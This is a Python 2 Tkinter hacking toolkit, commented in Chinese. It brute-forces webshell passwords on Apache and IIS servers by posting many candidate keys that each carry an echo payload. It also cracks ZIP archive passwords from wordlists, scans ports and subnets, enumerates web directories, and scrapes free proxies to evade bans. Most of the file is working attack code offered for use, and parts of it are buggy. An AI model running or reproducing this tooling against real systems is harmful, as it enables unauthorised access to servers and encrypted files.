# -*- coding:utf-8 -*-

#自带模板
from Tkinter import *
from ScrolledText import ScrolledText
import tkMessageBox
from random import choice
import urllib
import urllib2
import time
import threading
import zipfile
import string
import os
import sys
import socket
import platform
import re

#第三方模板
import requests

reload(sys)
sys.setdefaultencoding('utf-8')

#爆破功能
#一句话爆破

#导入字典
def loadfile():
	file = open('pass.txt','r')
	load_file = []
	num = 0
	s = file.read()
	for i in s.split():
		load_file.append(i)
		num += 1
	return load_file,num

header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'}

#将字典进行切割分组
def cut(num,file,j,n):
	if num > n:
		return file[j]
	else :
		return file

#Apache的一句话爆破
def apache(url,text1):
	text = []
	run_time = time.clock()#开始的时间
	listfile = []
	file = []
	num = 0
	listfile,num = loadfile()
	post = {}
	if num > 1000:
		for i in range(num/1000+1):
			file.append(listfile[i*1000:(i+1)*1000:])
	else :
		file = listfile
	a= "字典数量为{num},共{zu}组".format(num=num,zu=num/1000+1)
	for j in range(num/1000+1):
		for i in cut(num,file,j,1000):
			post[i] = "echo 'okpassword{password}';".format(password=i)
		for i in range(1):
			post_data = urllib.urlencode(post)
			post_data = post_data.replace('+',' ')
			res = urllib2.Request(url,data=post_data,headers=header)
			res = urllib2.urlopen(res).read()
			if 'ok' in res:
				# print '\n','第{num}组:'.format(num=j+1),'Success'
				# print '\n','The password is:',res.split('password')[1]
				# print '\n','The time used:',time.clock()-run_time,'\n'
				x = "第{num}组: Success".format(num=j+1)
				y = "The password is:{passwd}".format(passwd=res.split('password')[1])
				z = "The time used:{nowtime}".format(nowtime=time.clock()-run_time)
				text1.insert(END,a+'\n'+x+'\n'+y+'\n'+z)
				return
			else:
				print '\n','第{num}组:'.format(num=j+1),'Failed'
				print '\n','The time used:',time.clock()-run_time,'\n'

#iis的一句话爆破
def iis(url):
	listfile = []
	file = []
	num = 0
	listfile,num = loadfile()
	run_time = time.clock()
	post = {}
	if num > 5883:
		for j in range(num/5883+1):
			file.append(listfile[i*5883:(i+1)*5883:])
	else :
		file = listfile
	print '字典数量为{num}'.format(num=num),u'共{zu}组'.format(zu=num/5883+1)
	for i in range(num/5883+1):
		for i in cut(num,file,j,5883):
			post[i] = 'response.write("okpassword{password}")'.format(password=i)
		for i in range(1):
			post_data = urllib.urlencode(post)
			post_data = post_data.replace('+',' ')
			res = urllib2.Request(url,data=post_data,headers=header)
			res = urllib2.urlopen(res).read()
			if 'ok' in res:
				print '\n','The password is:',res.split('password')[1]
				print '\n','The time used:',time.clock()-run_time,'\n'
			else:
				print '\n','Failed'
				print '\n','The time used:',time.clock()-run_time,'\n'

#继承threading.Thread的线程类
class MyThread(threading.Thread):
	def __init__(self,arg,func):
		super(MyThread, self).__init__()#显式的调用父类的初始化函数。
		self.arg = arg
		self.func = func
	def run(self):#定义每个线程要运行的函数
		apply(self.func,self.arg)#apply参数只能为元组

#调用线程类执行函数
def main(url1,text1):
	url = (url1,text1)
	for i in xrange(1):
		t = MyThread(url,apache)
		t.start()

#####################################################################################################
#ZIP爆破

#创建ZIP爆破的类
class CrackZip(object):
	def __init__(self):
		self._result = None
	def run(self,zFile,password,text1):
		try:
			zFile.extractall(pwd=password)
			print "Found password:",password
			x = "Found password:{password}".format(password=password)
			text1.insert(END,x+'\n')
			self._result = password
		except:
			pass
	def getPass(self):
		return self._result

#检测文件是否存在
def checkFile(path):
	flag = False
	if not os.path.isfile(path):
		print "[-] %s文件不存在" %path
	return flag

#用字典进行爆破
def zip_zidian(zippath,txtpath):
	cz = CrackZip()
	flag = checkFile(txtpath)
	if not flag:
		if txtpath[-3:]!='txt':
			print '字典不是txt文件'
			exit()
	flag = checkFile(zippath)
	if not flag:
		if zippath[-3:]!='zip':
			print '选择的不是zip文件'
			exit()
	zFile = zipfile.ZipFile(zippath,'r')
	passFile = open(txtpath,'r')
	for i in passFile.readlines():
		password = i.strip().decode('gbk').encode('utf-8')
		if flag:
			#用多线程进行
			t = threading.Thread(target=cz.run,args=(zFile,password))
			t.start()
		else:
			cz.run(zFile,password)
			password = cz.getPass()
			typeName = 'SingleThread'
			if password:
				return
	if typeName == 'SingleThread':
		print "字典找不到密码".encode('utf-8')

#生成4位数字典
def diction(arg1,arg2):
	list_dict = []
	if arg2 != str(4):
		print '只能生成4位密码,可使用其它字典爆破'
		return
	else:
		#生成4位纯数字
		if arg1 == 'num':
			for i in string.digits:
				for j in string.digits:
					for k in string.digits:
						for l in string.digits:
							passwd = '{i}{j}{k}{l}'.format(i=i,j=j,k=k,l=l)
							list_dict.append(passwd)
			return list_dict
		#生成4位纯大写字母字母
		if arg1 == 'ABC':
			for i in string.uppercase:
				for j in string.uppercase:
					for k in string.uppercase:
						for l in string.uppercase:
							passwd = '{i}{j}{k}{l}'.format(i=i,j=j,k=k,l=l)
							list_dict.append(passwd)
			return list_dict
		#生成4位纯小写字母
		if arg1 == 'abc':
			for i in string.lowercase:
				for j in string.lowercase:
					for k in string.lowercase:
						for l in string.lowercase:
							passwd = '{i}{j}{k}{l}'.format(i=i,j=j,k=k,l=l)
							list_dict.append(passwd)
			return list_dict
		else :
			print '只能生成4位数字或大写字母或小写字母的字典'
			return

#用生成的字典进行爆破
def zipdict(zippath,text1):
	list_dict = []
	list_dict = diction('num','4')
	cz = CrackZip()
	flag = checkFile(zippath)
	if not flag:
		if zippath[-3:]!='zip':
			print '选择的不是zip文件'
			return
	zFile = zipfile.ZipFile(zippath,'r')
	for i in list_dict:
		if flag:
			t = threading.Thread(target=cz.run,args=(zFile,i,text1))
			t.start()
		else:
			cz.run(zFile,i,text1)
			i = cz.getPass()
			typeName = 'SingleThread'
			if i:
				return
	if typeName == 'SingleThread':
		print u"生成的字典中找不到密码"

####################################################################################################

#扫描功能
#端口扫描

socket.setdefaulttimeout(3)#定义响应时间位3秒

#将端口锁对应的服务功能导入从本地文件导入进字典中
def txt(port):
	file = open('port.txt','r')
	dict_data = {}
	with file as df:
		for kv in [d.strip().split(':') for d in df]:
			dict_data[kv[0]] = kv[1].decode('gbk').encode('utf-8')
	for i in dict_data:
		if i == str(port):
			return dict_data[i]

#扫描指定端口
def socket_port(ip,port,text1):
	lock=threading.Lock()
	try:
		if port>=65535:
			print '端口扫描结束'
			return
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		result=s.connect_ex((ip,port))
		if result==0:
			lock.acquire()#线程锁
			service = txt(port)
			if service == None:
				service = 'Unknown'
			else:
				pass
			x = "{ip} : {port} 端口开放 {s} ".format(ip=ip,port=port,s=service)
			print x
			text1.insert(END,x+'\n')
			lock.release()#释放线程锁
		s.close()
	except:
		print '端口扫描异常'

#循环1到4000端口
def ip(ip,text1):
	# if start > end:
	# 	print '输入错误'
	# 	sys.exit(1)
	try:
		print '开始扫描 %s' % ip
		start_time=time.clock()
		for i in xrange(4000):
			#print start,n
			t = threading.Thread(target=socket_port,args=(ip,int(i),text1))
			t.start()
			#start += 1
		print '\n','扫描端口完成，总共用时 ：%.2fs' %(time.clock()-start_time),
	except:
		print '扫描ip出错'

#得到服务器的系统     
def get_os():
	os = platform.system()
	if os == 'Windows':
		return "n"
	else:
		return "c"

#调用CMD进行ping ip 得到是否存在
def ip_scan(ip):
	try:
		s = 'ping -{os} 1 -w 1 {ip}'.format(os=get_os(),ip=ip)
		result = os.system(s)
		list_ip = []
		if result:
			pass
			return 0
		else :
			s = "[*]IP: %s is exit\n" %ip
			print s
			return 1
	except:
		print 'ping ip 失败'

#循环ip最后一位从1到254得以扫描C段存货主机
def c_scan(ip):
	start_time = time.clock()
	list_ip = []
	ip_pre = ip.split('.')[:-1]#以最后一个'.'进行切割
	ip_pre = '.'.join(ip_pre)
	for i in xrange(1,254):
		scanip = "%s.%s" %(ip_pre,i)
		if ip_scan(scanip) == 1:
			list_ip.append(scanip)
		else :
			pass
	return list_ip

###################################################################################################
#目录扫描

#导入需要扫描的目录
def open_txt():
	num = 1
	try:
		list_pass = []
		passwd = []
		file = open('http.txt','r')
		for i in file.readlines():
			list_pass.append(i)
		file.close()
		for i in list_pass:
			if i not in passwd:
				passwd.append(i)
				num = num+1
		return passwd,num
	except:
		return

header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'}

#用模拟登陆的形式测试目录是否存在
def http_scan(host,text):
	#proxies = {'http':prox}#设置代理
	passwd = []
	passwd,num = open_txt()
	try:
		for i in passwd:
			i = i.replace("\n",'')
			url = host+i
			res = requests.get(url,headers=header)
			if res.status_code == 200:
				x = "{url}   200".format(url=url)
				text.insert(END,x+'\n')
			if res.status_code == 403:
				print url,'  403'
			else:
				pass
		return 1
	except:
		return 0

#线程类
class MyThread(threading.Thread):
	def __init__(self,arg,func):
		super(MyThread, self).__init__()
		self.arg = arg
		self.func = func
	def run(self):
		apply(self.func,self.arg)

#从网站上抓取免费代理ip及端口存入列表
def proxies():
	try:
		url = 'http://www.xicidaili.com/nn'
		response = requests.get(url,headers=header)
		res = '<td>(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})</td>'#ip的正则表达式
		res = re.compile(res)
		result_ip = re.findall(res,response.text)
		res2 = '<td>(\d{2,4})</td>'#端口的正则
		res2 = re.compile(res2)
		result_port = re.findall(res2,response.text)
		return result_ip,result_port
	except:
		print "获取代理IP失败"
		return

def main2(url,text):
	http_scan(url,text)
	#没一个ip只扫描10个目录，防止扫描过多被ban
	proxie = []
	passwd,num = open_txt()
	proxies_ip,proxies_port = proxies()
	for i in range(97):
		ip_port = 'http://'+proxies_ip[i]+':'+proxies_port[i]
		proxie.append(ip_port)
	j = 1
	#for i in choice(proxie):
	for i in range(1):
		if j % 10 != 0:
			url = ('127.0.0.1','arg')
			t = MyThread(url,http_scan)
			t.start()
			j += 1
			#print j
		if j >= num :
			exit()
		else :
			j += 1
			continue

###################################################################################################
#GUI功能

#调用的函数功能
def boom():
    varl.set('--爆破--')
    Button(frame2,text='一句话',width=10,command=yijvhua,font=('微软雅黑',10)).grid(row=1,column=0,sticky=W,padx=15,pady=18)
    Button(frame2,text='ZIP',width=10,command=ZIP,font=('微软雅黑',10)).grid(row=1,column=1,sticky=W,padx=15,pady=18)

    frame2.pack()

def yijvhua():
    Label(frame3,text='网站:',font=(8)).grid(row=2,column=0)

    e1 = Entry(frame3,width=28,validate="focusout",validatecommand=lambda:test2(e1.get()),invalidcommand=intest)
    e1.grid(row=2,column=1,padx=10,pady=5)

    text1 = ScrolledText(frame4,font=('微软雅黑',8),width=43,height=9,padx=5,pady=5)
    text1.grid(row=0,column=0)

    frame3.pack()

    Button(frame3,text='开始爆破',font=(8),command=lambda:yyy(e1.get(),text1)).grid(row=4,column=1)

    frame4.pack(padx=20,pady=5)

def yyy(e1,text1):
	url = e1
	main(url,text1)

def ZIP():
    Label(frame3,text='路径:',font=(8)).grid(row=2,column=0)

    e1 = Entry(frame3,width=28,validate="focusout",validatecommand=lambda:test3(e1.get()),invalidcommand=intest)
    e1.grid(row=2,column=1,padx=10,pady=5)

    text1 = ScrolledText(frame4,font=('微软雅黑',8),width=43,height=9,padx=5,pady=5)
    text1.grid(row=0,column=0)

    frame3.pack()

    Button(frame3,text='开始爆破',font=(8),command=lambda:xxx(e1.get(),text1)).grid(row=4,column=1)

    frame4.pack(padx=20,pady=5)

def xxx(e1,text1):
	path = e1
	zipdict(path,text1)

def scan():
    varl.set('--扫描--')
    Button(frame2,text='C段端口',width=10,command=port_s,font=('微软雅黑',10)).grid(row=1,column=0,sticky=W,padx=15,pady=18)
    Button(frame2,text='目录',width=10,command=http_s,font=('微软雅黑',10)).grid(row=1,column=1,sticky=W,padx=15,pady=18)

    frame2.pack()

def port_s():
    Label(frame3,text='网站:',font=(8)).grid(row=2,column=0)

    e1 = Entry(frame3,width=28,validate="focusout",validatecommand=lambda:test(e1.get()),invalidcommand=intest)
    e1.grid(row=2,column=1,padx=10,pady=5)

    text1 = ScrolledText(frame4,font=('微软雅黑',8),width=43,height=9,padx=5,pady=5)
    text1.grid(row=0,column=0)

    frame3.pack()

    Button(frame3,text='开始扫描',font=(8),command=lambda:aaa(e1.get(),text1)).grid(row=4,column=1)

    frame4.pack(padx=20,pady=5)

def aaa(e1,text1):
	get_ip = e1
	ip(get_ip,text1)

def http_s():
    Label(frame3,text='网站:',font=(8)).grid(row=2,column=0)

    e1 = Entry(frame3,width=28,validate="focusout",validatecommand=lambda:test2(e1.get()),invalidcommand=intest)
    e1.grid(row=2,column=1,padx=10,pady=5)

    text1 = ScrolledText(frame4,font=('微软雅黑',8),width=43,height=9,padx=5,pady=5)
    text1.grid(row=0,column=0)

    frame3.pack()

    Button(frame3,text='开始扫描',font=(8),command=lambda:bbb(e1.get(),text1)).grid(row=4,column=1)

    frame4.pack(padx=20,pady=5)

def bbb(e1,text1):
	main2(e1,text1)

#验证输入是否正确
def test(e):
	res = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
	res = re.compile(res)
	if re.search(res,e)is not None:
		return True
	else :
		return False

def intest():
	tkMessageBox.showinfo('警告','输入错误')

def test2(e):
	res = r'https?://[^/]+?/'
	res = re.compile(res)
	if re.search(res,e)is not None:
		return True
	else :
		return False

def test3(e):
	res = r'.+\.{1}\w+'
	res = re.compile(res)
	if re.search(res,e)is not None:
		return True
	else :
		return False

#主界面
root = Tk()
#窗口标题
root.title('测试中......')

#背景图片
#photo = PhotoImage(file='bg.gif')

#窗口大小，窗口位置
root.geometry('500x300+600+200')

#主界面分为4个框架
frame1 = Frame(root)
frame2 = Frame(root)
frame3 = Frame(root)
frame4 = Frame(root)

varl = StringVar()

varl.set('--选择--')

textlabel = Label(frame1,textvariable=varl,font=('宋体',22)).grid(row=0,column=0,sticky=N,padx=20)

Button(frame1,text='Scan',width=10,command=scan,font=('微软雅黑',15)).grid(row=1,column=0,sticky=W,padx=15,pady=18)
Button(frame1,text='Boom',width=10,command=boom,font=('微软雅黑',15)).grid(row=2,column=0,sticky=W,padx=15,pady=18)
Button(frame1,text='Exit',width=10,command=root.quit,font=('微软雅黑',15)).grid(row=3,column=0,sticky=W,padx=15,pady=18)

frame1.pack(side=LEFT)

#执行界面
root.mainloop()